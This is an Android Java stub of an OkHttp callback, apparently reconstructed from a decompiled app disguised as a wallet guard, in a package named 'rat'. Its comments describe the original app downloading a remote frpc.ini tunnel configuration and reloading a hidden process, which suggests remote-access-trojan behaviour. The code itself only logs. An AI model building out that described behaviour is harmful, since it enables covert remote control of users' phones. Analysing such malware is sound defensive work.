package com.vendor.rat.network;

// ADAPT: vendor = com.guard.wallet.http.u (QueryAgentFileCallback)

import android.util.Log;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

/**
 * QueryAgentFileCallback - 代理文件查询回调
 * vendor: 解析 ApiResult<DeviceAgentFileVO>，下载 frpc.ini 并重新加载 RPC 进程
 */
public final class u implements Callback {

    private static final String TAG = "QueryAgentFileCallback";

    @Override
    public void onFailure(Call call, IOException e) {
        Log.e(TAG, "request failed", e);
    }

    @Override
    public void onResponse(Call call, Response response) throws IOException {
        try {
            String body = response.body() != null ? response.body().string() : "";
            Log.d(TAG, "response: " + response.code());
            // ADAPT: vendor parses ApiResult<DeviceAgentFileVO>,
            // downloads targetFileUrl to {dataDir}/frpc.ini, then reloads RPC process
        } catch (Exception e) {
            Log.e(TAG, "parse error", e);
        } finally {
            response.close();
        }
    }
}
